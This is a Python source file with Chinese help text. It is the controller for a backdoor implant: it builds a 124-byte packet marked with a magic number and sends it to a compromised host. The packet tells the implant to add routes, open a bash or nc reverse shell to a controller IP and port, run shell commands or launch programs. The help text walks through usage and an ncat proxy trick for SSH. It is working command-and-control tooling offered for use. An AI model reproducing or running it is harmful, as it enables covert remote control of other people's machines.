
import socket
import random
import math
import getopt
import sys
import logging
import re
import binascii


def bytearray2hexstr(content):
    return ''.join(format(x, '02x') for x in content)


def sendmsg(target, srvport, data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        try:
            s.connect((target, srvport))
        except socket.error as e:
            print ("Caught exception socket.error : %s" % e)
            return False
        s.sendall(data)

    return True

# 生成唤醒的包
# srvport: 被控制的服务器连接的端口
# ccip: 控制端IP
# ccport: 控制端服务端口
def generate_weakup_packet(srvport, ccip, ccport) :
    nsrvport = socket.htons(srvport).to_bytes(2, byteorder='little')
    # 生成控制端服务器和端口的网络字节组
    nipbytes = socket.inet_aton(ccip)
    nportbytes = socket.htons(ccport).to_bytes(2, byteorder='little')
    # 生成特征串
    s1 = random.randrange(1, 65535, 2)
    s2 = random.randrange(1, 65535, 2)
    s3 = math.pow(s1,2) + math.pow(s2,2)

    ins = 1
    bytes_ins = ins.to_bytes(1, byteorder='little')

    return bytearray(list(s1.to_bytes(2, byteorder='little'))) + bytearray(list(s2.to_bytes(2, byteorder='little'))) + \
        bytearray(list(int(s3).to_bytes(8, byteorder='little'))) + bytearray(list(bytes_ins)) + bytearray(list(nsrvport)) + \
        bytearray(list(nipbytes)) + bytearray(list(nportbytes))




# 帮助页
useinfo = '''
**************************************************
工具说明：
**************************************************

控制端需要给被控端发送特定的指令来激活被控端的功能。
发送的数据主要为以下格式：(固定长度124个字节)
---------------------------------------------------------------------------
|  2  |  2  |      8       |  2  |   4   |  2  |  2  |  2  |     100      |
---------------------------------------------------------------------------
|<--------flag------------>| ins |--cip--|port | p1  | p2  |     ext      |

flag:   标记，被控端通过次标记来识别网络流是否属于控制端的指令。
        一共12个字节固定大小 a² + b² = c²， 表数据各种中存储的
        数据为a|b|c²

ins:    指令， 通过不同的指令实现对被控端的功能控制, 指令格式如下：
        -----------
        | 8  | 8  |
        -----------
        | H  | L  |
        
        指令分为2个字节，高字节和低字节。
        低字节(L): 低字节主要用于控制功能,如下：（十六进制数据表示)
            01: 只添加路由功能
            02: 反弹连接
            03: 执行shell命令
            04: 执行程序
        高字节(H): 目前高字节的数据没有特别具体的使用，不为空的情况下
            会删除

        指令：
        01: 只添加路由
        02：反弹连接  
            目前支持的反弹连接: bash和nc反弹
            自发送这个指令的时候，ext 扩展段必须指定是bash还是nc
        03: 执行shell命令
        04: 执行程序 

cip:    控制服务器IP(必须)(网络字节序)
port:   控制服务器端口(必须)(网络字节序)
p1:     出网端口(必须)
p2:     功能端口(被控端实际与控制端通讯的本地程序功能端口)

整体的指令信息的长度为123个字节.

**************************************************
命令行：
**************************************************

-h:     帮助信息
-t:     目标地址
-p:     端口
-S:     控制服务器地址 
-P:     控制服务器端口

-x:     对应p1
-y:     对应p2
-e:     对应扩展(ext)
-i:     指令(01, 02, 03, 04) 都是用十六进制的数据形式表示
-d:     删除操作(指令字段高位置1)
-1:     同 -i 01 路由
-2:     同 -i 02 反弹
-3:     同 -i 03 执行shell命令
-4:     同 -i 04 执行程序


**************************************************
示例:
**************************************************
1.  c3.py -t 192.168.1.2  -p 80      -1       -S 192.168.1.3    -P 3333    -x 80             
          | 目标地址    ||端口  |   |路由指令| | 控制端IP      | |控制端口||被控端出网端口|

    // 发送 路由 指令到192.168.1.2的80端口，并指定控制服务器的IP为192.168.1.3 控制端口为：3333 被控端出网端口 80

2.  c3.py -t 192.168.1.2  -p 80      -2       -S 192.168.1.3  -P 2222    -x 80         -e bash     
          | 目标地址    | |端口 |   |反弹指令| | 控制端IP     | |控制端口||被控端出网端口| |扩展数据|
    // 发送 bash反弹 指令到192.168.1.2的80端口，并指定控制服务器的IP为192.168.1.3 控制端口为：2222 被控制出网端口 80

3.  c3.py -t 192.168.1.2  -p 80    -d       -1       -S 192.168.1.3  -P 3333   -x 80  
          | 目标程序    | |端口 |  |删除|   |路由指令| |控制端IP      | |控制端口||被控端出网端口|

    // 发送 删除路由 指令到192.168.1.2的80端口，并指定控制服务器的IP为192.168.1.3 控制端口为: 3333 被控出网端口为 80

4.  c3.py -t 192.168.1.2 -p 80 -1 -S 192.168.1.3 -P 3333 
    // 如果没有 -x 80 指定出网的端口，那么通讯用端口就是 -p 80 这个指定的端口

5.  c3.py -t 192.168.1.2 -p 80 -1 -S 192.168.1.3 -P 12345 -x 80 -y 22
    // 给被控制端添加路由，注意：必须指定出网端口(-x)和被控端本地端口(-y)

**************************************************
附加：
**************************************************
1. ssh 通过nc代理连接
    ssh -o ProxyCommand='ncat -x 127.0.0.1:1081 -p 12345 %h %p '  -p 80 username@192.168.1.2
    // ssh通过ncat的代理连接远程服务器的80端口，并且通过-p来指定ncat出网的端口
'''
def usage():
    print(useinfo)

logger = logging.getLogger()
logger.setLevel(logging.INFO)

handler = logging.StreamHandler(sys.stdout)
handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

def print_msg(insinfo):
    if insinfo['ins'] == 0x01:
        logger.info("成功发送指令:    路由")
    elif insinfo['ins'] == 0x02:
        logger.info("成功发送指令:    反弹指令")
    elif insinfo['ins'] == 0x03:
        logger.info("成功发送指令:    执行shell命令")
    elif insinfo['ins'] == 0x04:
        logger.info("成功发送指令:    执行程序")

# 打包数据
def wrapInsInfo(insinfo):
    result = bytearray(124)
    # 生成特征串
    s1 = random.randrange(1, 65535, 2)
    s2 = random.randrange(1, 65535, 2)
    s3 = math.pow(s1,2) + math.pow(s2,2)
    result[0:2] = bytearray(list(s1.to_bytes(2, byteorder='little')))
    result[2:4] = bytearray(list(s2.to_bytes(2, byteorder='little')))
    result[4:12] = bytearray(list(int(s3).to_bytes(8, byteorder='little')))
    # 指令
    ins = insinfo['ins']
    result[12:13] = ins.to_bytes(1, byteorder='little')
    if insinfo['del']:
        result[13:14] = 0x01.to_bytes(1, byteorder='little')
    else:
        result[13:14] = 0x00.to_bytes(1, byteorder='little')
    # print(binascii.hexlify(result))
    # 控制IP/Port
    if len(insinfo['ip']) > 0 and re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", insinfo['ip']):
        sipbytes = socket.inet_aton(insinfo['ip'])
        result[14:18] = sipbytes
    if insinfo['port'] > 0 and insinfo['port'] < 65535:
        sportbytes = socket.htons(insinfo['port']).to_bytes(2, byteorder='little')
        result[18:20] = sportbytes
    # 
    # p1 出网端口
    if insinfo['p1'] > 0 and insinfo['p1'] < 65535:
        p1bytes =  socket.htons(insinfo['p1']).to_bytes(2, byteorder='little')
        result[20:22] = p1bytes     
    # p2 服务端口
    if insinfo['p2'] > 0 and insinfo['p2'] < 65535:
        p2bytes = socket.htons(insinfo['p2']).to_bytes(2, byteorder='little')
        result[22:24] = p2bytes
    # ext 扩展
    if len(insinfo['ext']) > 0:
        extbytes = bytes(insinfo['ext'], encoding='utf-8')
        result[24:24 + len(insinfo['ext'])] = extbytes
    return result


if __name__ == '__main__':
    if len(sys.argv) == 1:
        usage()
        sys.exit(0)
        
    argv = sys.argv[1:]
    insinfo = {
        "ins":0,
        "del": False,
        "ip": "",       # 控制服务器地址
        "port":0,       # 控制服务器端口
        "p1":0,         # 被控端实际执行任务的端口
        "p2":0,         # 出网端口
        "ext": "",      # 扩展数据
    }

    target = ""
    target_port = 0

    try:
        opts, args = getopt.getopt(argv, "ht:p:di:1234S:P:x:y:e:")  
    except:
        print("Error")

    for opt, arg in opts:
        if opt in ['-h']:
            usage()
            exit()
        elif opt in ['-t']:
            target = arg
        elif opt in ['-p']:
            target_port = int(arg)
        elif opt in ['-i']:
            insinfo['ins'] = int(arg, 16)
        elif opt in ['-d']:
            insinfo['del'] = True
        elif opt in ['-1']:
            insinfo['ins'] = 0x01
        elif opt in ['-2']:
            insinfo['ins'] = 0x02
        elif opt in ['-3']:
            insinfo['ins'] = 0x03
        elif opt in ['-4']:
            insinfo['ins'] = 0x04
        elif opt in ['-S']:
            insinfo['ip'] = arg
        elif opt in ['-P']:
            insinfo['port'] = int(arg)
        elif opt in ['-x']:
            insinfo['p1'] = int(arg)
        elif opt in ['-y']:
            insinfo['p2'] = int(arg)
        elif opt in ['-e']:
            insinfo['ext'] = arg

    if insinfo['p1'] == 0:
        insinfo['p1'] = target_port

    if insinfo['ins']&0x00FF == 0x01:
        if insinfo['p2'] == 0:
            print("添加路由功能必须指定p2参数.")
            exit(1)
        

    content = wrapInsInfo(insinfo=insinfo)
    if len(content) > 0:
        if sendmsg(target=target, srvport=target_port, data =content):
            print_msg(insinfo=insinfo)
        else:
            logging.error("发送启动指令失败.")
            exit(1)
    pass